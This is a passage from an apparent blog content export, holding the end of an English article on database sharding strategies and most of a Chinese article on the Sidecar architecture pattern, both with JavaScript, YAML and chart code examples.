this.executeQuery(query); return result; &#125; &#125; Network Bandwidth Bottlenecks &#x2F;&#x2F; All traffic flows through one network interface class DataStore &#123; async handleRequest(request) &#123; &#x2F;&#x2F; Network interface saturated at 10Gbps &#x2F;&#x2F; Requests start getting dropped &#x2F;&#x2F; Response times increase dramatically return await this.processRequest(request); &#125; &#125; Geographic Distribution Challenges &#x2F;&#x2F; Users worldwide accessing a single data center class GlobalApplication &#123; async getUserData(userId) &#123; &#x2F;&#x2F; User in Tokyo accessing data in Virginia &#x2F;&#x2F; 200ms latency just for network round trip &#x2F;&#x2F; Compliance issues storing EU data in US return await this.database.query(&#123; userId &#125;); &#125; &#125; ⚠️ Vertical Scaling LimitationsTemporary Solution: Adding more CPU, memory, or disk to a single server Physical Limits: Eventually you can't add more resources Cost Inefficiency: High-end servers become exponentially expensive Single Point of Failure: One server failure affects all users The Solution: Horizontal Partitioning (Sharding) Divide the data store into horizontal partitions called shards. Each shard: Has the same schema Contains a distinct subset of data Runs on a separate storage node Operates independently graph TB A[Application Layer] --> B[Shard Map/Router] B --> C[Shard AOrders 0-999] B --> D[Shard BOrders 1000-1999] B --> E[Shard COrders 2000-2999] B --> F[Shard DOrders 3000+] C --> C1[(DatabaseServer 1)] D --> D1[(DatabaseServer 2)] E --> E1[(DatabaseServer 3)] F --> F1[(DatabaseServer 4)] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 style F fill:#51cf66,stroke:#2f9e44 Sharding Strategies 1. Lookup Strategy Use a mapping table to route requests to the appropriate shard: class LookupShardRouter &#123; constructor() &#123; &#x2F;&#x2F; Shard map stored in fast cache or database this.shardMap &#x3D; new Map([ [&#39;tenant-1&#39;, &#39;shard-a&#39;], [&#39;tenant-2&#39;, &#39;shard-a&#39;], [&#39;tenant-3&#39;, &#39;shard-b&#39;], [&#39;tenant-4&#39;, &#39;shard-c&#39;] ]); this.shardConnections &#x3D; &#123; &#39;shard-a&#39;: &#39;db1.example.com&#39;, &#39;shard-b&#39;: &#39;db2.example.com&#39;, &#39;shard-c&#39;: &#39;db3.example.com&#39; &#125;; &#125; getShardForTenant(tenantId) &#123; const shardKey &#x3D; this.shardMap.get(tenantId); return this.shardConnections[shardKey]; &#125; async queryTenantData(tenantId, query) &#123; const shardUrl &#x3D; this.getShardForTenant(tenantId); const connection &#x3D; await this.connect(shardUrl); return await connection.query(query); &#125; &#125; graph LR A[Request:Tenant-3] --> B[LookupShard Map] B --> C{Tenant-3→ Shard B} C --> D[(Shard BDatabase)] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style D fill:#51cf66,stroke:#2f9e44 💡 Lookup Strategy BenefitsFlexibility: Easy to rebalance by updating the map Virtual Shards: Map logical shards to fewer physical servers Control: Assign high-value tenants to dedicated shards 2. Range Strategy Group related items together based on sequential shard keys: class RangeShardRouter &#123; constructor() &#123; this.shardRanges &#x3D; [ &#123; min: &#39;2019-01-01&#39;, max: &#39;2019-03-31&#39;, shard: &#39;db-q1-2019.example.com&#39; &#125;, &#123; min: &#39;2019-04-01&#39;, max: &#39;2019-06-30&#39;, shard: &#39;db-q2-2019.example.com&#39; &#125;, &#123; min: &#39;2019-07-01&#39;, max: &#39;2019-09-30&#39;, shard: &#39;db-q3-2019.example.com&#39; &#125;, &#123; min: &#39;2019-10-01&#39;, max: &#39;2019-12-31&#39;, shard: &#39;db-q4-2019.example.com&#39; &#125; ]; &#125; getShardForDate(date) &#123; const range &#x3D; this.shardRanges.find(r &#x3D;&gt; date &gt;&#x3D; r.min &amp;&amp; date &lt;&#x3D; r.max ); return range ? range.shard : null; &#125; async queryOrdersByDateRange(startDate, endDate) &#123; &#x2F;&#x2F; Efficient: Query only relevant shards const relevantShards &#x3D; this.shardRanges .filter(r &#x3D;&gt; r.max &gt;&#x3D; startDate &amp;&amp; r.min &lt;&#x3D; endDate) .map(r &#x3D;&gt; r.shard); &#x2F;&#x2F; Parallel queries to multiple shards const results &#x3D; await Promise.all( relevantShards.map(shard &#x3D;&gt; this.queryShardByDateRange(shard, startDate, endDate) ) ); return results.flat(); &#125; &#125; graph TB A[Query:Orders in Q2 2019] --> B[Range Router] B --> C[Shard Q2Apr-Jun 2019] D[Query:Orders Apr-Jul 2019] --> B B --> C B --> E[Shard Q3Jul-Sep 2019] style A fill:#4dabf7,stroke:#1971c2 style D fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style C fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 💡 Range Strategy BenefitsRange Queries: Efficiently retrieve sequential data Natural Ordering: Data stored in logical order Time-Based Archival: Easy to archive old shards ⚠️ Range Strategy RisksHotspots: Recent data often accessed more frequently Uneven Distribution: Some ranges may grow larger than others 3. Hash Strategy Distribute data evenly using a hash function: class HashShardRouter &#123; constructor() &#123; this.shards &#x3D; [ &#39;db-shard-0.example.com&#39;, &#39;db-shard-1.example.com&#39;, &#39;db-shard-2.example.com&#39;, &#39;db-shard-3.example.com&#39; ]; &#125; hashUserId(userId) &#123; &#x2F;&#x2F; Simple hash function (use better hash in production) let hash &#x3D; 0; for (let i &#x3D; 0; i &lt; userId.length; i++) &#123; hash &#x3D; ((hash &lt;&lt; 5) - hash) + userId.charCodeAt(i); hash &#x3D; hash &amp; hash; &#x2F;&#x2F; Convert to 32-bit integer &#125; return Math.abs(hash); &#125; getShardForUser(userId) &#123; const hash &#x3D; this.hashUserId(userId); const shardIndex &#x3D; hash % this.shards.length; return this.shards[shardIndex]; &#125; async getUserData(userId) &#123; const shard &#x3D; this.getShardForUser(userId); const connection &#x3D; await this.connect(shard); return await connection.query(&#123; userId &#125;); &#125; &#125; &#x2F;&#x2F; Example distribution const router &#x3D; new HashShardRouter(); console.log(router.getShardForUser(&#39;user-123&#39;)); &#x2F;&#x2F; db-shard-2 console.log(router.getShardForUser(&#39;user-124&#39;)); &#x2F;&#x2F; db-shard-0 console.log(router.getShardForUser(&#39;user-125&#39;)); &#x2F;&#x2F; db-shard-3 &#x2F;&#x2F; Users distributed across shards graph TB A[User IDs] --> B[Hash Function] B --> C[user-55 → Hash: 2] B --> D[user-56 → Hash: 0] B --> E[user-57 → Hash: 1] C --> F[(Shard 2)] D --> G[(Shard 0)] E --> H[(Shard 1)] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style F fill:#51cf66,stroke:#2f9e44 style G fill:#51cf66,stroke:#2f9e44 style H fill:#51cf66,stroke:#2f9e44 💡 Hash Strategy BenefitsEven Distribution: Prevents hotspots No Lookup Table: Direct computation of shard location Scalable: Works well with many shards ⚠️ Hash Strategy ChallengesRange Queries: Difficult to query ranges efficiently Rebalancing: Adding shards requires rehashing data Strategy Comparison (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_7804a94ed')); var option = { \"title\": { \"text\": \"Sharding Strategy Trade-offs\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"Lookup\", \"Range\", \"Hash\"] }, \"radar\": { \"indicator\": [ { \"name\": \"Flexibility\", \"max\": 10 }, { \"name\": \"Even Distribution\", \"max\": 10 }, { \"name\": \"Range Query Performance\", \"max\": 10 }, { \"name\": \"Simplicity\", \"max\": 10 }, { \"name\": \"Rebalancing Ease\", \"max\": 10 } ] }, \"series\": [{ \"type\": \"radar\", \"data\": [ { \"value\": [9, 6, 5, 6, 9], \"name\": \"Lookup\" }, { \"value\": [5, 4, 10, 8, 3], \"name\": \"Range\" }, { \"value\": [6, 10, 3, 9, 4], \"name\": \"Hash\" } ] }] }; chart.setOption(option); } })(); Practical Implementation Example Here’s a complete sharding implementation for an e-commerce platform: class ShardedOrderDatabase &#123; constructor() &#123; &#x2F;&#x2F; Use hash strategy for even distribution this.shards &#x3D; [ &#123; id: 0, connection: &#39;orders-db-0.example.com&#39; &#125;, &#123; id: 1, connection: &#39;orders-db-1.example.com&#39; &#125;, &#123; id: 2, connection: &#39;orders-db-2.example.com&#39; &#125;, &#123; id: 3, connection: &#39;orders-db-3.example.com&#39; &#125; ]; &#125; getShardForOrder(orderId) &#123; &#x2F;&#x2F; Extract numeric part from order ID const numericId &#x3D; parseInt(orderId.replace(&#x2F;\\D&#x2F;g, &#39;&#39;)); const shardIndex &#x3D; numericId % this.shards.length; return this.shards[shardIndex]; &#125; async createOrder(order) &#123; const shard &#x3D; this.getShardForOrder(order.id); const connection &#x3D; await this.connectToShard(shard); try &#123; await connection.query( &#39;INSERT INTO orders (id, user_id, total, items) VALUES (?, ?, ?, ?)&#39;, [order.id, order.userId, order.total, JSON.stringify(order.items)] ); return &#123; success: true, shard: shard.id &#125;; &#125; catch (error) &#123; console.error(&#96;Failed to create order on shard $&#123;shard.id&#125;:&#96;, error); throw error; &#125; &#125; async getOrder(orderId) &#123; const shard &#x3D; this.getShardForOrder(orderId); const connection &#x3D; await this.connectToShard(shard); const result &#x3D; await connection.query( &#39;SELECT * FROM orders WHERE id &#x3D; ?&#39;, [orderId] ); return result[0]; &#125; async getUserOrders(userId) &#123; &#x2F;&#x2F; User orders spread across shards - need fan-out query const results &#x3D; await Promise.all( this.shards.map(async (shard) &#x3D;&gt; &#123; const connection &#x3D; await this.connectToShard(shard); return await connection.query( &#39;SELECT * FROM orders WHERE user_id &#x3D; ? ORDER BY created_at DESC&#39;, [userId] ); &#125;) ); &#x2F;&#x2F; Merge and sort results from all shards return results .flat() .sort((a, b) &#x3D;&gt; b.created_at - a.created_at); &#125; async connectToShard(shard) &#123; &#x2F;&#x2F; Connection pooling per shard if (!this.connections) &#123; this.connections &#x3D; new Map(); &#125; if (!this.connections.has(shard.id)) &#123; const connection &#x3D; await createDatabaseConnection(shard.connection); this.connections.set(shard.id, connection); &#125; return this.connections.get(shard.id); &#125; &#125; Key Considerations 1. Choosing the Shard Key The shard key determines data distribution and query performance: &#x2F;&#x2F; Good: Static, evenly distributed const shardKey &#x3D; user.id; &#x2F;&#x2F; UUID, never changes &#x2F;&#x2F; Bad: Can change over time const shardKey &#x3D; user.email; &#x2F;&#x2F; User might change email &#x2F;&#x2F; Bad: Uneven distribution const shardKey &#x3D; user.country; &#x2F;&#x2F; Some countries have many more users 📝 Shard Key Best PracticesImmutable: Choose keys that never change High Cardinality: Many unique values for even distribution Query Aligned: Support your most common query patterns Avoid Hotspots: Prevent sequential keys if using hash strategy 2. Cross-Shard Queries Minimize queries that span multiple shards: class OptimizedShardedDatabase &#123; &#x2F;&#x2F; Good: Single shard query async getOrderById(orderId) &#123; const shard &#x3D; this.getShardForOrder(orderId); return await this.queryShardById(shard, orderId); &#125; &#x2F;&#x2F; Acceptable: Fan-out with caching async getUserOrderCount(userId) &#123; &#x2F;&#x2F; Cache the result to avoid repeated fan-out queries const cached &#x3D; await this.cache.get(&#96;order_count:$&#123;userId&#125;&#96;); if (cached) return cached; const counts &#x3D; await Promise.all( this.shards.map(shard &#x3D;&gt; this.countUserOrders(shard, userId)) ); const total &#x3D; counts.reduce((sum, count) &#x3D;&gt; sum + count, 0); await this.cache.set(&#96;order_count:$&#123;userId&#125;&#96;, total, 300); &#x2F;&#x2F; 5 min TTL return total; &#125; &#x2F;&#x2F; Better: Denormalize to avoid cross-shard queries async getUserOrderCountOptimized(userId) &#123; &#x2F;&#x2F; Store count in user shard const userShard &#x3D; this.getShardForUser(userId); return await this.queryUserOrderCount(userShard, userId); &#125; &#125; 3. Rebalancing Shards Plan for growth and rebalancing: class RebalancingShardManager &#123; async addNewShard(newShardConnection) &#123; &#x2F;&#x2F; 1. Add new shard to configuration this.shards.push(&#123; id: this.shards.length, connection: newShardConnection &#125;); &#x2F;&#x2F; 2. Gradually migrate data await this.migrateDataToNewShard(); &#x2F;&#x2F; 3. Update shard map await this.updateShardMap(); &#125; async migrateDataToNewShard() &#123; &#x2F;&#x2F; Use virtual shards for easier rebalancing const virtualShards &#x3D; 1000; &#x2F;&#x2F; Many virtual shards const physicalShards &#x3D; this.shards.length; &#x2F;&#x2F; Remap virtual shards to physical shards for (let i &#x3D; 0; i &lt; virtualShards; i++) &#123; const newPhysicalShard &#x3D; i % physicalShards; await this.remapVirtualShard(i, newPhysicalShard); &#125; &#125; &#125; 4. Handling Failures Implement resilience strategies: class ResilientShardedDatabase &#123; async queryWithRetry(shard, query, maxRetries &#x3D; 3) &#123; for (let attempt &#x3D; 1; attempt &lt;&#x3D; maxRetries; attempt++) &#123; try &#123; return await this.queryShard(shard, query); &#125; catch (error) &#123; if (attempt &#x3D;&#x3D;&#x3D; maxRetries) &#123; &#x2F;&#x2F; Try replica if available if (shard.replica) &#123; return await this.queryShard(shard.replica, query); &#125; throw error; &#125; &#x2F;&#x2F; Exponential backoff await this.sleep(Math.pow(2, attempt) * 100); &#125; &#125; &#125; async queryShard(shard, query) &#123; const connection &#x3D; await this.connectToShard(shard); return await connection.query(query); &#125; sleep(ms) &#123; return new Promise(resolve &#x3D;&gt; setTimeout(resolve, ms)); &#125; &#125; When to Use Sharding ✅ Use Sharding WhenMassive Scale: Data volume exceeds single server capacity High Throughput: Need to handle millions of concurrent operations Geographic Distribution: Users spread across multiple regions Cost Optimization: Multiple commodity servers cheaper than one high-end server ⚠️ Avoid Sharding WhenSmall Scale: Data fits comfortably on one server Complex Joins: Application relies heavily on cross-table joins Limited Resources: Team lacks expertise to manage distributed systems Premature Optimization: Vertical scaling still viable Benefits Summary Scalability: Add more shards as data grows Performance: Parallel processing across shards Cost Efficiency: Use commodity hardware instead of expensive servers Geographic Proximity: Place data close to users Fault Isolation: Failure in one shard doesn’t affect others Challenges Summary Complexity: More moving parts to manage Cross-Shard Queries: Expensive fan-out operations Rebalancing: Difficult to redistribute data Referential Integrity: Hard to maintain across shards Operational Overhead: Monitoring, backup, and maintenance multiply References Data Partitioning Guidance Sharding Pattern","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"Sidecar 模式：在不触碰代码的情况下扩展应用程序","slug":"2019/07/Sidecar-Pattern-zh-CN","date":"un66fin66","updated":"un22fin22","comments":true,"path":"/zh-CN/2019/07/Sidecar-Pattern/","permalink":"https://neo01.com/zh-CN/2019/07/Sidecar-Pattern/","excerpt":"将支持组件部署在应用程序旁边的独立容器中。了解 Sidecar 模式如何实现隔离、封装和异构技术堆栈。","text":"想象一下在摩托车上安装边车。边车与摩托车共享旅程，提供额外功能，但仍然是一个独立的单元。这正是 Sidecar 模式在软件架构中的运作方式——一种强大的方法，可以在不修改核心应用程序代码的情况下扩展应用程序功能。 摩托车类比 这个模式的名称来自摩托车边车。就像边车： 附加在摩托车上 共享相同的旅程 提供额外容量 可以独立添加或移除 软件中的 sidecar 组件： 部署在主应用程序旁边 共享相同的生命周期 提供支持功能 独立运作 graph LR A[客户端] --> B[负载均衡器] B --> C[应用程序实例 1] B --> D[应用程序实例 2] C --- C1[Sidecar 1] D --- D1[Sidecar 2] C1 --> E[监控服务] D1 --> E C1 --> F[日志聚合器] D1 --> F style C fill:#4dabf7,stroke:#1971c2 style D fill:#4dabf7,stroke:#1971c2 style C1 fill:#ffd43b,stroke:#fab005 style D1 fill:#ffd43b,stroke:#fab005 问题：横切关注点 现代应用程序需要各种支持功能： 日志记录和监控 配置管理 服务发现 网络代理 安全性和身份验证 传统方法及其限制 方法 1：将所有内容嵌入应用程序 class Application &#123; constructor() &#123; this.logger &#x3D; new Logger(); this.metrics &#x3D; new MetricsCollector(); this.config &#x3D; new ConfigManager(); this.healthCheck &#x3D; new HealthChecker(); &#125; async processRequest(request) &#123; &#x2F;&#x2F; 业务逻辑与基础设施关注点混合 this.logger.log(&#39;Processing request&#39;); this.metrics.increment(&#39;requests&#39;); const config &#x3D; await this.config.get(&#39;settings&#39;); const result &#x3D; await this.businessLogic(request, config); this.metrics.recordLatency(Date.now() - request.startTime); return result; &#125; &#125; ⚠️ 嵌入式方法的问题紧密耦合：基础设施代码与业务逻辑混合 语言锁定：所有组件必须使用相同语言 更新困难：更新日志记录需要更改应用程序代码 资源共享：日志记录中的错误可能导致整个应用程序崩溃 方法 2：独立服务 &#x2F;&#x2F; 应用程序对独立服务进行网络调用 class Application &#123; async processRequest(request) &#123; await fetch(&#39;http:&#x2F;&#x2F;logging-service&#x2F;log&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; message: &#39;Processing request&#39; &#125;) &#125;); const result &#x3D; await this.businessLogic(request); await fetch(&#39;http:&#x2F;&#x2F;metrics-service&#x2F;record&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; metric: &#39;request_processed&#39; &#125;) &#125;); return result; &#125; &#125; ⚠️ 独立服务的问题网络延迟：每个日志或指标都需要网络调用 复杂性：管理多个服务端点 故障处理：如果日志服务停机怎么办？ 解决方案：Sidecar 模式 将支持组件部署为与主应用程序一起运行的独立进程或容器： # 容器编排配置 services: main-app: image: my-application:latest ports: - &quot;8080:8080&quot; logging-sidecar: image: log-collector:latest volumes: - &#x2F;var&#x2F;log&#x2F;app:&#x2F;logs monitoring-sidecar: image: metrics-exporter:latest environment: - METRICS_PORT&#x3D;9090 应用程序保持简单： &#x2F;&#x2F; 应用程序纯粹专注于业务逻辑 class Application &#123; async processRequest(request) &#123; &#x2F;&#x2F; 只写入 stdout - sidecar 处理收集 console.log(&#39;Processing request&#39;); &#x2F;&#x2F; 仅业务逻辑 const result &#x3D; await this.businessLogic(request); return result; &#125; &#125; Sidecar 处理基础设施关注点： &#x2F;&#x2F; 日志 sidecar（独立进程） class LoggingSidecar &#123; constructor() &#123; this.logAggregator &#x3D; new LogAggregator(); &#125; async start() &#123; &#x2F;&#x2F; 监视应用程序日志 const logStream &#x3D; fs.createReadStream(&#39;&#x2F;var&#x2F;log&#x2F;app&#x2F;stdout&#39;); logStream.on(&#39;data&#39;, (chunk) &#x3D;&gt; &#123; const logs &#x3D; this.parseLogEntries(chunk); &#x2F;&#x2F; 使用元数据丰富 logs.forEach(log &#x3D;&gt; &#123; log.hostname &#x3D; os.hostname(); log.timestamp &#x3D; new Date().toISOString(); log.environment &#x3D; process.env.ENVIRONMENT; &#125;); &#x2F;&#x2F; 发送到集中式日志记录 this.logAggregator.send(logs); &#125;); &#125; &#125; 主要优势 1. 语言独立性 不同组件可以使用不同语言： services: # Node.js 中的主应用程序 app: image: node:18 command: node server.js # Go 中的监控 sidecar（为了性能） metrics: image: golang:1.20 command: .&#x2F;metrics-collector # Python 中的日志处理器（用于 ML 分析） logs: image: python:3.11 command: python log_analyzer.py 2. 隔离和容错 Sidecar 中的崩溃不会终止主应用程序： &#x2F;&#x2F; 主应用程序继续运行 class Application &#123; async processRequest(request) &#123; try &#123; &#x2F;&#x2F; 尝试记录（sidecar 可能停机） await this.notifySidecar(&#39;request_received&#39;); &#125; catch (error) &#123; &#x2F;&#x2F; Sidecar 不可用，但我们继续 console.error(&#39;Sidecar unavailable:&#39;, error.message); &#125; &#x2F;&#x2F; 无论如何业务逻辑都会继续 return await this.businessLogic(request); &#125; &#125; 3. 资源管理 独立控制资源： services: app: image: my-app:latest resources: limits: memory: 2G cpu: &quot;2.0&quot; sidecar: image: log-collector:latest resources: limits: memory: 512M cpu: &quot;0.5&quot; 4. 独立更新 在不触碰应用程序的情况下更新 sidecar： # 将监控 sidecar 更新到新版本 kubectl set image deployment&#x2F;my-app \\ monitoring-sidecar&#x3D;metrics-collector:v2.0 # 应用程序继续运行不变 常见使用案例 使用案例 1：服务网格代理 Sidecar 代理处理所有网络通信： graph LR A[服务 A] --> A1[代理 Sidecar] B[服务 B] --> B1[代理 Sidecar] A1 -->|加密| B1 A1 --> C[服务发现] B1 --> C A1 --> D[指标] B1 --> D style A fill:#4dabf7,stroke:#1971c2 style B fill:#4dabf7,stroke:#1971c2 style A1 fill:#ffd43b,stroke:#fab005 style B1 fill:#ffd43b,stroke:#fab005 &#x2F;&#x2F; 应用程序进行简单的 HTTP 调用 class ServiceA &#123; async callServiceB(data) &#123; &#x2F;&#x2F; 代理 sidecar 处理： &#x2F;&#x2F; - 服务发现 &#x2F;&#x2F; - 负载均衡 &#x2F;&#x2F; - 重试逻辑 &#x2F;&#x2F; - 断路器 &#x2F;&#x2F; - TLS 加密 &#x2F;&#x2F; - 指标收集 return await fetch(&#39;http:&#x2F;&#x2F;localhost:15001&#x2F;service-b&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(data) &#125;); &#125; &#125; 使用案例 2：配置管理 Sidecar 监视配置变更： &#x2F;&#x2F; 配置 sidecar class ConfigSidecar &#123; constructor() &#123; this.configStore &#x3D; new ConfigStore(); this.sharedVolume &#x3D; &#39;&#x2F;config&#39;; &#125; async start() &#123; &#x2F;&#x2F; 监视配置变更 this.configStore.watch(&#39;app-config&#39;, async (newConfig) &#x3D;&gt; &#123; &#x2F;&#x2F; 写入共享卷 await fs.writeFile( &#96;$&#123;this.sharedVolume&#125;&#x2F;config.json&#96;, JSON.stringify(newConfig) ); &#x2F;&#x2F; 通知应用程序（通过信号或 API） await this.notifyApplication(&#39;config_updated&#39;); &#125;); &#125; &#125; &#x2F;&#x2F; 应用程序从共享卷读取 class Application &#123; loadConfig() &#123; return JSON.parse( fs.readFileSync(&#39;&#x2F;config&#x2F;config.json&#39;, &#39;utf8&#39;) ); &#125; &#125; 使用案例 3：日志聚合 在不更改应用程序的情况下收集和转发日志： &#x2F;&#x2F; 应用程序只写入 stdout&#x2F;stderr console.log(&#39;User logged in:&#39;, userId); console.error(&#39;Payment failed:&#39;, error); &#x2F;&#x2F; Sidecar 收集和处理 class LogAggregationSidecar &#123; async collectLogs() &#123; const logs &#x3D; await this.readApplicationLogs(); &#x2F;&#x2F; 解析和丰富 const enrichedLogs &#x3D; logs.map(log &#x3D;&gt; (&#123; ...log, service: &#39;payment-service&#39;, version: process.env.APP_VERSION, region: process.env.REGION, timestamp: new Date().toISOString() &#125;)); &#x2F;&#x2F; 转发到日志聚合服务 await this.forwardToLogService(enrichedLogs); &#125; &#125; 使用案例 4：安全性和身份验证 在 sidecar 级别处理身份验证： &#x2F;&#x2F; 身份验证 sidecar 拦截请求 class AuthSidecar &#123; async handleRequest(req) &#123; &#x2F;&#x2F; 验证 JWT 令牌 const token &#x3D; req.headers.authorization; const user &#x3D; await this.validateToken(token); if (!user) &#123; return &#123; status: 401, body: &#39;Unauthorized&#39; &#125;; &#125; &#x2F;&#x2F; 将用户上下文添加到请求 req.headers[&#39;X-User-Id&#39;] &#x3D; user.id; req.headers[&#39;X-User-Roles&#39;] &#x3D; user.roles.join(&#39;,&#39;); &#x2F;&#x2F; 转发到应用程序 return await this.forwardToApp(req); &#125; &#125; &#x2F;&#x2F; 应用程序接收已验证的请求 class Application &#123; async handleRequest(req) &#123; &#x2F;&#x2F; 用户已由 sidecar 验证 const userId &#x3D; req.headers[&#39;X-User-Id&#39;]; const roles &#x3D; req.headers[&#39;X-User-Roles&#39;].split(&#39;,&#39;); &#x2F;&#x2F; 专注于业务逻辑 return await this.processBusinessLogic(userId, roles); &#125; &#125; 实现模式 模式 1：共享卷 Sidecar 通过共享文件系统通信： services: app: volumes: - shared-data:&#x2F;data sidecar: volumes: - shared-data:&#x2F;data volumes: shared-data: 模式 2：本地主机网络 Sidecar 通过 localhost 通信： &#x2F;&#x2F; 应用程序公开指标端点 app.get(&#39;&#x2F;metrics&#39;, (req, res) &#x3D;&gt; &#123; res.json(&#123; requests: requestCount, errors: errorCount &#125;); &#125;); &#x2F;&#x2F; Sidecar 抓取指标 class MetricsSidecar &#123; async collectMetrics() &#123; const response &#x3D; await fetch(&#39;http:&#x2F;&#x2F;localhost:8080&#x2F;metrics&#39;); const metrics &#x3D; await response.json(); await this.exportToMonitoring(metrics); &#125; &#125; 模式 3：进程间通信 使用信号或套接字进行通信： &#x2F;&#x2F; 应用程序监听信号 process.on(&#39;SIGUSR1&#39;, () &#x3D;&gt; &#123; console.log(&#39;Reloading configuration...&#39;); this.reloadConfig(); &#125;); &#x2F;&#x2F; Sidecar 发送信号 class ConfigSidecar &#123; async notifyConfigChange() &#123; const appPid &#x3D; await this.getApplicationPid(); process.kill(appPid, &#39;SIGUSR1&#39;); &#125; &#125; 何时使用 Sidecar 模式 理想场景 ✅ 完美使用案例异构应用程序：多个不同语言的服务需要相同功能 横切关注点：适用于所有服务的日志记录、监控、配置 第三方集成：为您无法控制的应用程序添加功能 独立扩展：Sidecar 和应用程序有不同的资源需求 真实世界范例 微服务平台 服务网格代理（Envoy、Linkerd） 日志收集器（Fluentd、Filebeat） 指标导出器（Prometheus 导出器） 秘密管理器 遗留应用程序现代化 为遗留应用程序添加监控 实现现代身份验证 启用服务发现 添加断路器 何时避免 ❌ 不适合的情况严格的性能要求：进程间通信开销不可接受 简单应用程序：管理 sidecar 的开销超过好处 需要深度集成：Sidecar 需要访问应用程序内部 需要独立扩展：Sidecar 和应用程序需要不同的扩展策略 考量和权衡 部署复杂性 管理每个应用程序实例的多个容器： # 之前：简单部署 docker run my-app:latest # 之后：协调部署 docker-compose up # 或 kubectl apply -f deployment.yaml 📝 复杂性管理使用容器编排平台（Kubernetes、Docker Swarm）自动管理 sidecar 生命周期。 资源开销 每个应用程序实例现在运行多个进程： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_d4ce053aa')); var option = { \"title\": { \"text\": \"资源使用：独立 vs Sidecar\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"独立应用程序\", \"应用程序 + Sidecar\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"CPU\", \"内存\", \"网络\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"资源单位\" }, \"series\": [ { \"name\": \"独立应用程序\", \"type\": \"bar\", \"data\": [100, 100, 100], \"itemStyle\": { \"color\": \"#4dabf7\" } }, { \"name\": \"应用程序 + Sidecar\", \"type\": \"bar\", \"data\": [120, 130, 110], \"itemStyle\": { \"color\": \"#ffd43b\" } } ] }; chart.setOption(option); } })(); 通信延迟 进程间通信增加开销： &#x2F;&#x2F; 直接函数调用：约 1 微秒 this.logger.log(&#39;message&#39;); &#x2F;&#x2F; HTTP 到 sidecar：约 1 毫秒 await fetch(&#39;http:&#x2F;&#x2F;localhost:9090&#x2F;log&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; message: &#39;message&#39; &#125;) &#125;); &#x2F;&#x2F; 共享卷：约 100 微秒 await fs.appendFile(&#39;&#x2F;logs&#x2F;app.log&#39;, &#39;message\\n&#39;); 💡 优化策略使用 Localhost：最小化网络开销 批处理操作：聚合多个调用 异步通信：不等待 sidecar 响应 共享内存：对高频率数据使用内存映射文件 完整实现范例 这是一个包含应用程序和监控 sidecar 的全面范例： &#x2F;&#x2F; main-app.js - 应用程序 const express &#x3D; require(&#39;express&#39;); const app &#x3D; express(); class Application &#123; constructor() &#123; this.requestCount &#x3D; 0; this.errorCount &#x3D; 0; &#125; &#x2F;&#x2F; 业务逻辑端点 setupRoutes() &#123; app.post(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; this.requestCount++; try &#123; const order &#x3D; await this.processOrder(req.body); console.log(&#39;Order processed:&#39;, order.id); res.json(order); &#125; catch (error) &#123; this.errorCount++; console.error(&#39;Order failed:&#39;, error.message); res.status(500).json(&#123; error: error.message &#125;); &#125; &#125;); &#x2F;&#x2F; 供 sidecar 使用的指标端点 app.get(&#39;&#x2F;internal&#x2F;metrics&#39;, (req, res) &#x3D;&gt; &#123; res.json(&#123; requests: this.requestCount, errors: this.errorCount, uptime: process.uptime() &#125;); &#125;); &#125; async processOrder(orderData) &#123; &#x2F;&#x2F; 业务逻辑在这里 return &#123; id: Date.now(), ...orderData &#125;; &#125; start() &#123; this.setupRoutes(); app.listen(8080, () &#x3D;&gt; &#123; console.log(&#39;Application running on port 8080&#39;); &#125;); &#125; &#125; new Application().start(); &#x2F;&#x2F; monitoring-sidecar.js - 监控 Sidecar const fetch &#x3D; require(&#39;node-fetch&#39;); class MonitoringSidecar &#123; constructor() &#123; this.metricsEndpoint &#x3D; &#39;http:&#x2F;&#x2F;localhost:8080&#x2F;internal&#x2F;metrics&#39;; this.exportEndpoint &#x3D; process.env.METRICS_EXPORT_URL; &#125; async collectMetrics() &#123; try &#123; const response &#x3D; await fetch(this.metricsEndpoint); const metrics &#x3D; await response.json(); &#x2F;&#x2F; 使用环境数据丰富 const enrichedMetrics &#x3D; &#123; ...metrics, hostname: require(&#39;os&#39;).hostname(), timestamp: new Date().toISOString(), environment: process.env.ENVIRONMENT, version: process.env.APP_VERSION &#125;; &#x2F;&#x2F; 导出到监控系统 await this.exportMetrics(enrichedMetrics); console.log(&#39;Metrics collected:&#39;, enrichedMetrics); &#125; catch (error) &#123; console.error(&#39;Failed to collect metrics:&#39;, error.message); &#125; &#125; async exportMetrics(metrics) &#123; if (!this.exportEndpoint) return; await fetch(this.exportEndpoint, &#123; method: &#39;POST&#39;, headers: &#123; &#39;Content-Type&#39;: &#39;application&#x2F;json&#39; &#125;, body: JSON.stringify(metrics) &#125;); &#125; start() &#123; console.log(&#39;Monitoring sidecar started&#39;); &#x2F;&#x2F; 每 10 秒收集指标 setInterval(() &#x3D;&gt; this.collectMetrics(), 10000); &#125; &#125; new MonitoringSidecar().start(); # docker-compose.yml - 部署配置 version: &#39;3.8&#39; services: app: build: .&#x2F;app ports: - &quot;8080:8080&quot; environment: - ENVIRONMENT&#x3D;production - APP_VERSION&#x3D;1.0.0 networks: - app-network monitoring-sidecar: build: .&#x2F;monitoring-sidecar environment: - 